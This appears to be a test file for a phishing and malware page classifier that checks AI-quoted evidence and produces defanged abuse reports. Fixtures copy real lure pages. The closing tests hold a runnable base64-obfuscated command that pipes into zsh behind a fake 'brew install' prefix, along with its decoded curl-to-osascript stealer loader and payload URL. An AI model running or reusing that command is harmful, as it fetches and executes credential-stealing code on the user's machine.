import { expect, test } from "bun:test";

import { buildProviderReportNarrative } from "./abuse/providers/report_payload";
import {
	buildWebsiteAnalysisInput,
	buildWebsiteClassificationInput,
	buildWebsiteReportEvidence,
	reportableWebsiteHop,
	validateWebsiteSiteClassification,
	WEBSITE_CLASSIFICATION_FORMAT,
	websiteSiteAssessments,
} from "./website_ai";
import { capturedDocumentContent } from "./website_archive";
import { extractPasteCommands } from "./malware/paste_commands";
import type { WebsiteNavigationHop } from "./website_types";

const shareGoogleHop: WebsiteNavigationHop = {
	index: 0,
	url: "https://share.google/ZAq2FghpGquJH6ShL",
	hostname: "share.google",
	status: 302,
	redirectTo: "https://www.google.com/share.google?q=ZAq2FghpGquJH6ShL",
	contentType: "text/html; charset=UTF-8",
	contentCaptured: false,
};

const finalTrollHop: WebsiteNavigationHop = {
	index: 1,
	url: "https://fuckyou.gay/",
	hostname: "fuckyou.gay",
	status: 200,
	contentType: "text/html; charset=UTF-8",
	contentCaptured: true,
};

const redirectArchive = {
	requestedUrl: shareGoogleHop.url,
	url: finalTrollHop.url,
	hostname: finalTrollHop.hostname,
	navigationHops: [shareGoogleHop, finalTrollHop],
	text: Buffer.from("You got trolled. Fuck you!", "utf-8"),
	html: Buffer.from("<html><body>You got trolled. Fuck you!</body></html>", "utf-8"),
};

const tiktokCoinKitHop: WebsiteNavigationHop = {
	index: 0,
	url: "https://potato-nursery-energy-las.trycloudflare.com/",
	hostname: "potato-nursery-energy-las.trycloudflare.com",
	status: 200,
	contentType: "text/html; charset=utf-8",
	contentCaptured: true,
};

/**
 * Excerpt of the TikTok coin-recharge kit captured for submission
 * 370164894110060547: Vietnamese copy, script-driven dialogs, and no <form>.
 * Its payment dialog sits beyond the 12,000-character HTML excerpt.
 */
const tiktokCoinKitArchive = {
	requestedUrl: tiktokCoinKitHop.url,
	url: tiktokCoinKitHop.url,
	hostname: tiktokCoinKitHop.hostname,
	navigationHops: [tiktokCoinKitHop],
	text: Buffer.from([
		"Nạp xu TikTok",
		"Nạp xu TikTok - Trung tâm nạp xu TikTok",
		"Phương thức thanh toán",
		"Thanh toán",
		"TikTok ID",
		"Chúng tôi không yêu cầu người dùng cung cấp mật khẩu khi đăng nhập. Vui lòng không cung cấp mật khẩu cho bất kỳ ai.",
		"Thẻ điện thoại & thẻ game",
		" Chọn nhà cung cấp",
		" Mã thẻ",
		"Số seri",
		"Thanh toán ngay",
	].join("\n"), "utf-8"),
	html: Buffer.from(`<html lang="vi"><head><title>Nạp xu TikTok</title></head><body>
<input type="text" class="search-box" placeholder="Tìm kiếm">
<h1 class="main-title">Nạp xu TikTok - Trung tâm nạp xu TikTok</h1>
<div class="coin-packages">${'<div class="package-card" data-amount="100000" data-coins="700"><span class="color-coin">700</span><div class="coin-value">100,000 ₫</div></div>'.repeat(100)}</div>
<div class="payment-section"><h3 class="payment-title">Phương thức thanh toán</h3><button class="payment-button" id="payment-button">Thanh toán</button></div>
<div class="login-form"><h3 class="login-title">TikTok ID</h3><input type="text" class="login-input" placeholder="Nhập TikTok ID của bạn" id="username"></div>
<div class="payment-popup" id="paymentPopup">
<input type="radio" name="payment_method" value="bank-transfer" id="bank-transfer">
<input type="radio" name="payment_method" value="phone-card" id="phone-card">
<label class="provider-card" for="phone-viettel"><input type="radio" name="phone_provider" value="viettel" id="phone-viettel"></label>
<div class="input-group"><label class="input-label">Mã thẻ</label><input type="text" class="card-input" id="phone-card-code" placeholder="Nhập mã thẻ" autocomplete="off"></div>
<div class="input-group"><label class="input-label">Số seri</label><input type="text" class="card-input" id="phone-card-serial" placeholder="Nhập seri thẻ" autocomplete="off"></div>
<button class="process-btn" id="process-btn">Thanh toán ngay</button>
</div></body></html>`, "utf-8"),
};

const tiktokCardFields = [
	{ ref: "f3", control: "input[type=text]", id: "phone-card-code", autocomplete: "off", label: "Mã thẻ", placeholder: "Nhập mã thẻ" },
	{ ref: "f4", control: "input[type=text]", id: "phone-card-serial", autocomplete: "off", label: "Số seri", placeholder: "Nhập seri thẻ" },
];

function validateTikTokKit(collectionFieldRefs: unknown, evidenceQuote = "Phương thức thanh toán") {
	// The production classifier returned this finding, basis, and quote for the kit.
	return validateWebsiteSiteClassification(
		{ finding: "phishing", phishingBasis: "payment_fraud", evidenceQuote, collectionFieldRefs, continuationRef: "" },
		tiktokCoinKitArchive.text.toString("utf-8"),
		tiktokCoinKitArchive.html.toString("utf-8"),
	);
}

function capturedPage(url: string, text: string, html: string) {
	const hop: WebsiteNavigationHop = { index: 0, url, hostname: new URL(url).hostname, status: 200, contentType: "text/html", contentCaptured: true };
	return { hop, archive: { requestedUrl: url, url, hostname: hop.hostname, navigationHops: [hop], text: Buffer.from(text, "utf-8"), html: Buffer.from(html, "utf-8") } };
}

function classify(page: ReturnType<typeof capturedPage>, response: Record<string, unknown>) {
	return validateWebsiteSiteClassification({ collectionFieldRefs: [], continuationRef: "", ...response }, page.archive.text.toString("utf-8"), page.archive.html.toString("utf-8"));
}

function reportablePage(page: ReturnType<typeof capturedPage>, classification: ReturnType<typeof classify>) {
	return reportableWebsiteHop(page.archive.navigationHops, websiteSiteAssessments(page.archive.navigationHops, page.hop.index, classification), page.archive);
}

/** The German Apple-account lure captured for submission 369886451581587485: one button, no fields. */
const appleAccountLure = capturedPage(
	"https://appeal.policy-review.cloud/gate/security?next=%2Flogin",
	[
		"Apple Account",
		"Kontoprüfung",
		"Dein Apple-Account wurde wegen eines möglichen Verstoßes gegen unsere Nutzungsbedingungen für eine Sicherheitsprüfung markiert. Um den Zugriff wiederherzustellen, verifiziere deine Identität.",
		"Bitte bestätige deine Identität, um einen Einspruch einzureichen und den Zugriff auf dein Konto wiederherzustellen.",
		"Weiter",
		"Copyright © 2026 Apple Inc. Alle Rechte vorbehalten.",
	].join("\n"),
	'<html lang="de"><head><title>Apple Account</title></head><body><h1>Kontoprüfung</h1><p>Dein Apple-Account wurde wegen eines möglichen Verstoßes gegen unsere Nutzungsbedingungen für eine Sicherheitsprüfung markiert.</p><button class="button" id="continueBtn">Weiter</button></body></html>',
);
const appleLureQuote = "Um den Zugriff wiederherzustellen, verifiziere deine Identität.";

const fakeChromeUpdate = capturedPage(
	"https://chrome-update-center.trycloudflare.com/",
	"Google Chrome\nYour version of Chrome is out of date and can no longer display this page.\nUpdate Chrome\nInstall the latest update to continue browsing.",
	'<html><head><title>Google Chrome</title></head><body><p>Your version of Chrome is out of date and can no longer display this page.</p><a id="update" href="/download/ChromeSetup.exe" download>Update Chrome</a></body></html>',
);

const fakeCaptchaCommand = capturedPage(
	"https://verification-cloudflare.example-check.com/",
	"Vérifiez que vous êtes humain\nPour terminer la vérification :\nAppuyez sur Windows + R\nAppuyez sur Ctrl + V\nAppuyez sur Entrée\nCloudflare",
	'<html lang="fr"><body><h1>Vérifiez que vous êtes humain</h1><ol><li>Appuyez sur Windows + R</li><li>Appuyez sur Ctrl + V</li><li>Appuyez sur Entrée</li></ol><button id="verify">Je ne suis pas un robot</button></body></html>',
);

test("detailed analysis binds the page content to the exact captured URL", () => {
	const input = buildWebsiteAnalysisInput(redirectArchive);
	const system = input[0].content as string;
	const text = (input[1].content as Array<{ text: string }>)[0]!.text;

	expect(system).toContain("Never attribute one hop's content");
	expect(text).toContain(`The page content below belongs only to this final URL: ${finalTrollHop.url}`);
	expect(text).toContain(shareGoogleHop.url);
	expect(text).toContain("Only the analyzed hop's page content is given below");
	expect(text).toContain("a prank/troll");
	expect(text).toContain("You got trolled");
});

test("classification receives only one exact site's captured evidence", () => {
	const input = buildWebsiteClassificationInput(finalTrollHop, redirectArchive);
	const system = input[0].content as string;
	const userContent = input[1].content as Array<{ type: string; text?: string }>;

	expect(system).toContain("A prank, troll page");
	expect(userContent[0]?.text).toContain(finalTrollHop.url);
	expect(userContent[0]?.text).toContain("You got trolled");
	expect(userContent[0]?.text).toContain("data_entry_fields: []");
	expect(userContent[0]?.text).not.toContain(shareGoogleHop.url);
	expect(() => buildWebsiteClassificationInput(shareGoogleHop, redirectArchive)).toThrow("exact navigation hop");
});

test("classification covers lures and malware and lists fields beyond the HTML excerpt", () => {
	const input = buildWebsiteClassificationInput(tiktokCoinKitHop, tiktokCoinKitArchive);
	const system = input[0].content as string;
	const text = (input[1].content as Array<{ text: string }>)[0]!.text;

	expect(system).toContain("any language");
	expect(system).toContain("A lure page that only leads to that step counts");
	expect(system).toContain("Return malware when the page gets the visitor to download, install, or run");
	expect(system).toContain("asks to paste a command");
	expect(system).not.toContain("malware_delivery");
	expect(tiktokCoinKitArchive.html.toString("utf-8").indexOf("phone-card-code")).toBeGreaterThan(12_000);
	expect(text).toContain("data_entry_fields[4]{ref,control,id,name,autocomplete,label,placeholder}:");
	expect(text).toContain('f3,"input[type=text]",phone-card-code,null,off,Mã thẻ,Nhập mã thẻ');
	expect(text).toContain('f4,"input[type=text]",phone-card-serial,null,off,Số seri,Nhập seri thẻ');
	expect(text).not.toContain("bank-transfer");
	expect(WEBSITE_CLASSIFICATION_FORMAT.schema).toMatchObject({
		properties: {
			finding: { enum: ["phishing", "malware", "benign", "prank_or_troll", "insufficient_evidence"] },
			phishingBasis: { enum: ["credential_theft", "payment_fraud", "none"] },
			collectionFieldRefs: { type: "array", items: { type: "string" } },
			continuationRef: { type: "string" },
		},
		required: ["finding", "phishingBasis", "evidenceQuote", "collectionFieldRefs", "continuationRef"],
	});
});

test("a Vietnamese payment kit without a form is reportable with its cited fields", () => {
	const classification = validateTikTokKit(["f3", " F4 ", "f3"]);
	expect(classification).toEqual({
		finding: "phishing",
		phishingBasis: "payment_fraud",
		evidenceQuote: "Phương thức thanh toán",
		collectionFields: tiktokCardFields,
	});

	const assessments = websiteSiteAssessments(tiktokCoinKitArchive.navigationHops, tiktokCoinKitHop.index, classification);
	expect(reportableWebsiteHop(tiktokCoinKitArchive.navigationHops, assessments, tiktokCoinKitArchive)).toEqual(tiktokCoinKitHop);
});

test("a lure page that only leads to a sign-in step is reportable without data-entry fields", () => {
	const classification = classify(appleAccountLure, { finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: appleLureQuote });

	expect(classification).toEqual({ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: appleLureQuote });
	expect(reportablePage(appleAccountLure, classification)).toEqual(appleAccountLure.hop);
});

test("pages that push a download or a pasted command are reportable as malware", () => {
	const update = classify(fakeChromeUpdate, { finding: "malware", phishingBasis: "none", evidenceQuote: "Your version of Chrome is out of date and can no longer display this page." });
	expect(update).toEqual({ finding: "malware", evidenceQuote: "Your version of Chrome is out of date and can no longer display this page." });
	expect(reportablePage(fakeChromeUpdate, update)).toEqual(fakeChromeUpdate.hop);

	const command = classify(fakeCaptchaCommand, { finding: "malware", phishingBasis: "none", evidenceQuote: "Appuyez sur Windows + R\nAppuyez sur Ctrl + V" });
	expect(command).toEqual({ finding: "malware", evidenceQuote: "Appuyez sur Windows + R Appuyez sur Ctrl + V" });
	expect(reportablePage(fakeCaptchaCommand, command)).toEqual(fakeCaptchaCommand.hop);
});

test("field references are supporting evidence and unknown ones are dropped", () => {
	// The radio buttons that choose a payment method are not data-entry fields, and element ids are not refs.
	expect(validateTikTokKit(["f3", "f5", "phone-card-code"])).toEqual({
		finding: "phishing",
		phishingBasis: "payment_fraud",
		evidenceQuote: "Phương thức thanh toán",
		collectionFields: [tiktokCardFields[0]],
	});
	expect(validateTikTokKit([])).toEqual({ finding: "phishing", phishingBasis: "payment_fraud", evidenceQuote: "Phương thức thanh toán" });
});

test("a quote spanning several page lines keeps its text and drops the line breaks", () => {
	// gpt-5.5 quoted these consecutive lines of the captured kit.
	expect(validateTikTokKit(["f3", "f4"], "Thẻ điện thoại & thẻ game\n Chọn nhà cung cấp\n Mã thẻ\n Số seri\n Thanh toán ngay")).toEqual({
		finding: "phishing",
		phishingBasis: "payment_fraud",
		evidenceQuote: "Thẻ điện thoại & thẻ game Chọn nhà cung cấp Mã thẻ Số seri Thanh toán ngay",
		collectionFields: tiktokCardFields,
	});
	expect(validateTikTokKit(["f3"], "Mã thẻ\u0007")).toEqual({
		finding: "insufficient_evidence",
		rejectedClaim: "its evidence quote contains no page text",
	});
});

test("a quote joining separate page lines is evidence when each line is verbatim page text", () => {
	// Production case 375349501428240400: a fake Chrome download page; the model
	// quoted the page heading with a download button further down.
	const page = capturedPage(
		"https://googie-chrome.top/",
		"Google Chrome 网络浏览器\n得益于 Google 的智能工具，Chrome 现在更易用、更安全、更快捷。\n下载 Chrome\n适用于 Windows 11/10 64-bit",
		"<a href=\"#download\">下载 Chrome</a>",
	);
	const classification = classify(page, { finding: "malware", phishingBasis: "none", evidenceQuote: "Google Chrome 网络浏览器\n下载 Chrome" });
	expect(classification).toEqual({ finding: "malware", evidenceQuote: "Google Chrome 网络浏览器 … 下载 Chrome" });
	expect(reportablePage(page, classification)).toEqual(page.hop);

	// One invented line still makes the whole quote invented.
	expect(classify(page, { finding: "malware", phishingBasis: "none", evidenceQuote: "Google Chrome 网络浏览器\n立即安装更新" })).toEqual({
		finding: "insufficient_evidence",
		rejectedClaim: "its evidence quote does not appear verbatim in the captured page text",
	});
	// Each line must carry page text of its own, not only punctuation found anywhere.
	expect(classify(page, { finding: "malware", phishingBasis: "none", evidenceQuote: "Google Chrome 网络浏览器\n。" })).toEqual({
		finding: "insufficient_evidence",
		rejectedClaim: "its evidence quote does not appear verbatim in the captured page text",
	});
});

test("quotes match despite typographic punctuation and invisible characters", () => {
	const page = capturedPage(
		"https://secure-paypal-review.example.net/",
		"PayPal\nYour account has been limited \u2014 \u201Cconfirm\u201D your Pay\u200BPal details to restore access.",
		"<input type=\"password\">",
	);
	expect(classify(page, { finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "account has been limited - \"confirm\" your PayPal details", collectionFieldRefs: ["f1"], continuationRef: "" })).toMatchObject({
		finding: "phishing",
		collectionFields: [{ ref: "f1", control: "input[type=password]" }],
	});
});

test("an overlong verbatim quote is kept as a bounded verbatim prefix", () => {
	const sentence = "Please verify your account details to avoid suspension.";
	const page = capturedPage("https://account-verify.example.org/", Array(20).fill(sentence).join(" "), "<input name=\"email\">");
	const quote = Array(15).fill(sentence).join(" ");
	const classification = classify(page, { finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: quote });

	expect(quote.length).toBeGreaterThan(500);
	expect(classification.evidenceQuote!.length).toBeLessThanOrEqual(500);
	expect(quote.startsWith(classification.evidenceQuote!)).toBeTrue();
	expect(quote[classification.evidenceQuote!.length]).toBe(" ");
	expect(reportablePage(page, classification)).toEqual(page.hop);
});

test("short quotes in non-Latin scripts are valid evidence", () => {
	expect(validateWebsiteSiteClassification(
		{ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "请输入密码", collectionFieldRefs: ["f2"], continuationRef: "" },
		"中国银行\n账号\n请输入密码\n登录",
		'<div class="login"><input name="account"><input type="password" aria-label="密码"></div>',
	)).toEqual({
		finding: "phishing",
		phishingBasis: "credential_theft",
		evidenceQuote: "请输入密码",
		collectionFields: [{ ref: "f2", control: "input[type=password]", label: "密码" }],
	});
});

test("a quote running from a heading into placeholder-only fields is verbatim page text", () => {
	// Production case: a Microsoft kit whose fields carry their labels only as placeholders.
	const { html, text } = capturedDocumentContent(`<html lang="es"><head><title>DEMO</title></head><body><form>
<p><img src="microsoft_logo.png" alt="Microsoft Logo"></p><h1>Iniciar sesión</h1><p>Verificación Microsoft</p>
<input type="email" placeholder="Correo electrónico, teléfono o Skype" required><input type="text" placeholder="Contraseña de correo" required>
<a href="#">¿No puede acceder a su cuenta?</a><button>Siguiente</button>
</form></body></html>`);

	expect(validateWebsiteSiteClassification(
		{ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "Verificación Microsoft\nCorreo electrónico, teléfono o Skype\nContraseña de correo", collectionFieldRefs: ["f1", "f2"], continuationRef: "" },
		text,
		html,
	)).toMatchObject({
		finding: "phishing",
		evidenceQuote: "Verificación Microsoft Correo electrónico, teléfono o Skype Contraseña de correo",
		collectionFields: [{ ref: "f1", control: "input[type=email]" }, { ref: "f2", control: "input[type=text]" }],
	});
});

test("phishing claims without a harmful action or verbatim page evidence are not reported", () => {
	expect(validateWebsiteSiteClassification({ finding: "prank_or_troll", phishingBasis: "none", evidenceQuote: "", collectionFieldRefs: [], continuationRef: "" }, "You got trolled. Fuck you!", "<html></html>")).toEqual({ finding: "prank_or_troll" });
	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "unrelated fabricated evidence", collectionFieldRefs: ["f1"], continuationRef: "" }, "You got trolled. Fuck you!", "<html><form><input type=\"password\"></form></html>")).toEqual({
		finding: "insufficient_evidence",
		rejectedClaim: "its evidence quote does not appear verbatim in the captured page text",
	});
	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "password asks to verify the unrelated account credentials".repeat(10), collectionFieldRefs: ["f1"], continuationRef: "" }, "password asks to verify the unrelated account credentials", "<html><form><input type=\"password\"></form></html>")).toEqual({
		finding: "insufficient_evidence",
		rejectedClaim: "its evidence quote does not appear verbatim in the captured page text",
	});
	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "!", collectionFieldRefs: [], continuationRef: "" }, "Sign in!", "<input type=\"password\">")).toEqual({
		finding: "insufficient_evidence",
		rejectedClaim: "its evidence quote contains no page text",
	});
	expect(validateWebsiteSiteClassification({ finding: "phishing", phishingBasis: "none", evidenceQuote: "You got trolled. Fuck you!", collectionFieldRefs: [], continuationRef: "" }, "You got trolled. Fuck you!", "<html></html>")).toEqual({
		finding: "insufficient_evidence",
		rejectedClaim: "it named no credential theft or payment fraud",
	});
	expect(() => validateWebsiteSiteClassification({ finding: "suspicious", phishingBasis: "none", evidenceQuote: "", collectionFieldRefs: [], continuationRef: "" }, "page text", "<html></html>")).toThrow("invalid finding");
	expect(() => validateWebsiteSiteClassification({ finding: "benign", phishingBasis: "none", evidenceQuote: "" }, "page text", "<html></html>")).toThrow("collection field references");
});

test("redirect-only hops cannot inherit the captured destination's finding", () => {
	expect(websiteSiteAssessments([shareGoogleHop, finalTrollHop], 1, { finding: "prank_or_troll" })).toEqual([
		{ hopIndex: 0, finding: "insufficient_evidence" },
		{ hopIndex: 1, finding: "prank_or_troll" },
	]);
});

test("a captured credential-collection page remains eligible for an exact-site phishing finding", () => {
	const hop: WebsiteNavigationHop = {
		index: 0,
		url: "https://idcredian.com/TylerBaker7651",
		hostname: "idcredian.com",
		status: 200,
		contentType: "text/html",
		contentCaptured: true,
	};
	const archive = {
		requestedUrl: hop.url,
		url: hop.url,
		hostname: hop.hostname,
		navigationHops: [hop],
		text: Buffer.from("Welcome | USPS\\nConfirm your delivery address and pay a redelivery fee.", "utf-8"),
		html: Buffer.from('<title>Welcome | USPS</title><form><input type="password" name="password"><input name="cardNumber"></form>', "utf-8"),
		screenshotPng: Buffer.from("fake png bytes", "utf-8"),
	};
	const content = buildWebsiteClassificationInput(hop, archive)[1].content as Array<{ type: string }>;

	expect(content[0]?.type).toBe("input_text");
	expect(content[1]?.type).toBe("input_image");
	const classification = validateWebsiteSiteClassification({
		finding: "phishing",
		phishingBasis: "credential_theft",
		evidenceQuote: "Confirm your delivery address and pay a redelivery fee.",
		collectionFieldRefs: ["f1"], continuationRef: "",
	}, archive.text.toString(), archive.html.toString());
	const passwordField = { ref: "f1", control: "input[type=password]", name: "password" };
	expect(classification).toEqual({
		finding: "phishing",
		phishingBasis: "credential_theft",
		evidenceQuote: "Confirm your delivery address and pay a redelivery fee.",
		collectionFields: [passwordField],
	});
	expect(websiteSiteAssessments([hop], 0, classification)).toEqual([{
		hopIndex: 0,
		finding: "phishing",
		phishingBasis: "credential_theft",
		evidenceQuote: "Confirm your delivery address and pay a redelivery fee.",
		collectionFields: [passwordField],
	}]);
});


test("the report gate rejects troll pages and never lets destination content trigger a source-hop report", () => {
	const trollAssessments = websiteSiteAssessments([shareGoogleHop, finalTrollHop], 1, { finding: "prank_or_troll" });
	expect(reportableWebsiteHop([shareGoogleHop, finalTrollHop], trollAssessments, redirectArchive)).toBeUndefined();

	const capturedPhishing = {
		finding: "phishing" as const,
		phishingBasis: "credential_theft" as const,
		evidenceQuote: "This exact quote supports the captured site's harmful action.",
	};
	const capturedArchive = { ...redirectArchive, text: Buffer.from("This exact quote supports the captured site's harmful action.") };
	expect(reportableWebsiteHop([shareGoogleHop, finalTrollHop], websiteSiteAssessments([shareGoogleHop, finalTrollHop], 1, capturedPhishing), capturedArchive)).toEqual(finalTrollHop);
	expect(reportableWebsiteHop([shareGoogleHop, finalTrollHop], websiteSiteAssessments([shareGoogleHop, finalTrollHop], 1, capturedPhishing), redirectArchive)).toBeUndefined();
	// Even a malformed assessment cannot send the terminal page's evidence to the shortener.
	expect(reportableWebsiteHop(
		[shareGoogleHop, finalTrollHop],
		[{ hopIndex: shareGoogleHop.index, ...capturedPhishing, evidenceQuote: "redirect response only" }],
		redirectArchive,
	)).toBeUndefined();
});

test("the report handoff states the verified finding as plain sentences, not the captured document", () => {
	const lure = classify(appleAccountLure, { finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: appleLureQuote });
	const evidence = buildWebsiteReportEvidence(lure);
	expect(evidence.split("\n")).toEqual([
		"The page impersonates a trusted brand and asks visitors for a password, sign-in details, a verification code, or identity details, or leads them to a step that does.",
		`Page text that shows it, in its original language: ${JSON.stringify(appleLureQuote)}.`,
	]);
	expect(evidence).not.toContain("<html");

	const narrate = (description: string) => buildProviderReportNarrative({
		provider: "cloudflare",
		target: appleAccountLure.hop.hostname,
		observedUrls: [appleAccountLure.hop.url],
		description,
		maximumLength: 1_000,
	});
	expect(narrate(buildWebsiteReportEvidence({ finding: "phishing" }))).toBeUndefined();
	expect(narrate(evidence)).toContain("a login or credential-collection flow");

	const update = classify(fakeChromeUpdate, { finding: "malware", phishingBasis: "none", evidenceQuote: "Update Chrome" });
	expect(buildWebsiteReportEvidence(update)).toContain("The page distributes malware");
	const malwareNarrative = buildProviderReportNarrative({
		provider: "cloudflare",
		allegationCategory: "malware",
		target: fakeChromeUpdate.hop.hostname,
		observedUrls: [fakeChromeUpdate.hop.url],
		description: buildWebsiteReportEvidence(update),
		maximumLength: 1_000,
	});
	expect(malwareNarrative).toContain("suspected malware distribution URL");
	expect(malwareNarrative).toContain("The page distributes malware");
	expect(malwareNarrative).not.toContain("phishing");
});

// Production case 375628583143477248: paneo.work, an invented macOS app site. Its
// "Download for macOS" button opens an install dialog at the very end of the page
// whose command decodes to a curl | osascript stealer loader. The classifier only
// saw the first 10,000 characters and called the page benign.
const paneoInstallCommand = `: "brew install --cask paneo" && echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL29nWmhNSkI3RjI3NyB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh`;
const paneo = capturedPage(
	"https://paneo.work/",
	[
		"Paneo — Window Manager for macOS Power Users",
		"Download for macOS",
		...Array.from({ length: 400 }, (_, index) => `Feature ${index}: every layout arranges itself across every monitor.`),
		"Install Paneo",
		"1 Open Terminal",
		"2 Run the install command",
		`${paneoInstallCommand} Copy command`,
		"Paste into Terminal and press Return.",
	].join("\n"),
	"<html><body><a href=\"#download\" data-conversion=\"download\">Download for macOS</a></body></html>",
);

test("the classifier reads the whole page and the decoded install command, not a 10,000-character prefix", () => {
	expect(paneo.archive.text.toString("utf-8").indexOf("Install Paneo")).toBeGreaterThan(12_000);
	const analysis = buildWebsiteAnalysisInput({ ...paneo.archive });
	const analysisText = (analysis[1].content as Array<{ text?: string }>)[0]!.text!;
	expect(analysisText).toContain("2 Run the install command");
	expect(analysisText).toContain("curl -sfL https://keychainagent.pro/wksxgj/ogZhMJB7F277 | osascript -l JavaScript");
	expect(analysisText).toContain("distributes malware");

	const classification = buildWebsiteClassificationInput(paneo.hop, { ...paneo.archive });
	const system = classification[0].content as string;
	const user = (classification[1].content as Array<{ text: string }>)[0]!.text;
	expect(system).toContain("Return malware when");
	expect(system).toContain("The brand on a malware page may be invented");
	expect(user).toContain("Install Paneo");
	expect(user).toContain("payload_urls");
	expect(user).toContain("https://keychainagent.pro/wksxgj/ogZhMJB7F277");
	expect(user).toContain("brew install --cask paneo");
});

test("an invented-brand app site with a pasted stealer command is reported as malware with the decoded command", () => {
	const finding = classify(paneo, { finding: "malware", phishingBasis: "none", evidenceQuote: paneoInstallCommand });
	expect(finding).toEqual({ finding: "malware", evidenceQuote: paneoInstallCommand });
	expect(reportablePage(paneo, finding)).toEqual(paneo.hop);

	const evidence = buildWebsiteReportEvidence(finding, extractPasteCommands(paneo.archive.text.toString("utf-8")));
	const defanged = `: "brew install --cask paneo" [and] echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL29nWmhNSkI3RjI3NyB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' [pipe] base64 -d [pipe] zsh`;
	expect(evidence.split("\n")).toEqual([
		"The page distributes malware: it gets visitors to download, install, or run something that harms them.",
		`Page text that shows it, in its original language (defanged): ${JSON.stringify(defanged)}.`,
		`The page tells visitors to paste and run this command (defanged): ${JSON.stringify(defanged)}.`,
		`Decoded, it runs: "curl -sfL hxxps://keychainagent[.]pro/wksxgj/ogZhMJB7F277 [pipe] osascript -l JavaScript".`,
		`It shows "brew install --cask paneo" so the visitor believes a legitimate install is running.`,
		"It downloads and runs code from: hxxps://keychainagent[.]pro/wksxgj/ogZhMJB7F277.",
	]);
	// Report text never carries a runnable command: abuse-form firewalls block a shell chain into an interpreter.
	expect(evidence).not.toMatch(/\|\s*(?:z|ba)?sh\b|;\s*echo|https:\/\/keychainagent/);
	// The assessment keeps the verbatim quote for the case page.
	expect(finding.evidenceQuote).toBe(paneoInstallCommand);
});

test("a malware claim needs a verbatim quote and phishing never carries a malware basis", () => {
	expect(classify(paneo, { finding: "malware", phishingBasis: "none", evidenceQuote: "Run this to get infected" })).toEqual({
		finding: "insufficient_evidence",
		rejectedClaim: "its evidence quote does not appear verbatim in the captured page text",
	});
	expect(classify(paneo, { finding: "phishing", phishingBasis: "malware_delivery", evidenceQuote: "Install Paneo" })).toEqual({
		finding: "insufficient_evidence",
		rejectedClaim: "it named no credential theft or payment fraud",
	});
	// A malware finding names no phishing basis even if the model sends one.
	expect(classify(paneo, { finding: "malware", phishingBasis: "credential_theft", evidenceQuote: "Install Paneo" })).toEqual({ finding: "malware", evidenceQuote: "Install Paneo" });
});
